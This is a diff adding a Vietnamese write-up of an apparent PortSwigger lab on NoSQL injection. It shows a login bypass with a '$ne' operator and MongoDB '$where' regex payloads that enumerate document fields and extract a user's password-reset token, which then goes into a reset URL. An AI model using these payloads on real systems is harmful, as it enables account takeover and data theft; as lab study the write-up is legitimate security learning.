@@ -77,7 +77,55 @@ Ngoài ra cũng có thể dùng && là `administrator' && this.password.length <
 <h1>---------------------------------------------------------</h1>
 <br>
 
+![image](https://github.com/user-attachments/assets/710dbf0a-0115-438d-9d21-1d275464b258)
 
+Tôi bật intercept và đổi password thành `{"$ne":""}` để login
+
+![image](https://github.com/user-attachments/assets/36ed51fd-2279-437b-85e5-ec5347f875da)
+
+![image](https://github.com/user-attachments/assets/e99acfb8-09cd-4ff7-9f09-137c5b5173fb)
+
+Khi dùng với carlos thì bị khóa, không vào được 
+
+![image](https://github.com/user-attachments/assets/8030c8be-328c-4214-9522-b563196c0b09)
+
+Tính năng quên mật khẩu thì lại cần email mà tôi không có cái đấy 
+
+![image](https://github.com/user-attachments/assets/14b8b3e3-c709-4df0-ac40-d8f243b2281b)
+
+Có vẻ tôi cần phải tìm token của carlos thì mới đổi được mật khẩu, dùng payload `{"username":"carlos","password":{"$ne":"invalid"}, "$where": "0"}` để test thử, $where là một toán tử trong MongoDB cho phép thực thi JavaScript trong truy vấn. Nó thường được dùng để viết các điều kiện phức tạp mà cú pháp MongoDB thông thường không hỗ trợ, nó có chức năng giống cái WHERE trong SQL ấy 
+
+![image](https://github.com/user-attachments/assets/851bbf54-d4f5-48b2-83b7-63b61353b93c)
+
+![image](https://github.com/user-attachments/assets/332e2fbe-d1f9-4505-8354-7916e65728f2)
+
+Với `"$where":"0"` thì đại diện cho false và `"$where":"1"` là true, có được bật tắt rồi thì chắc là đi mò thôi, dùng payload `{"username":"carlos","password":{"$ne":""}, "$where":"Object.keys(this)[1].match('^.{1}a.*')"}` để tìm tên của trường thứ 2 
+
+![image](https://github.com/user-attachments/assets/bf08bf59-5094-4a34-9b8f-4e7d1d1007e6)
+
+Và có thể dễ thấy đây là trường username, tiếp tục tăng cái `Object.keys(this)[1]` thành `Object.keys(this)[2]` và ra được trường thứ 3 là password:
+
+![image](https://github.com/user-attachments/assets/94ad4ca3-bd03-4acd-9c30-fcd03e3ff7fa)
+
+Tiếp đó là trường thứ 4 là email:
+
+![image](https://github.com/user-attachments/assets/db93fec5-8015-4430-95f5-11deb6138428)
+
+Và cuối cùng cũng ra forgotPwd
+
+![image](https://github.com/user-attachments/assets/d89af80d-b3c1-4795-985f-617197e09ea2)
+
+Đổi payload thành `{"username":"carlos","password":{"$ne":""}, "$where":"this.forgotPwd.match('^.{1}a.*')"}` 
+
+![image](https://github.com/user-attachments/assets/4c02acf8-7fe0-4263-8b4d-f49dfc1bc4b5)
+
+![image](https://github.com/user-attachments/assets/214937d5-1e73-4f68-81c6-c92c48df82b9)
+
+ra được ea2e50370207186a, ném vào cái req forgot password là `https://0a560042049dfa94809290e700300094.web-security-academy.net/forgot-password?forgotPwd=ea2e50370207186a`
+
+![image](https://github.com/user-attachments/assets/9c2653ce-9d36-46fb-ae41-5f93a513008c)
+
+![image](https://github.com/user-attachments/assets/7342fde0-a8b0-4266-82b5-f8782621a54e)
 
 
 
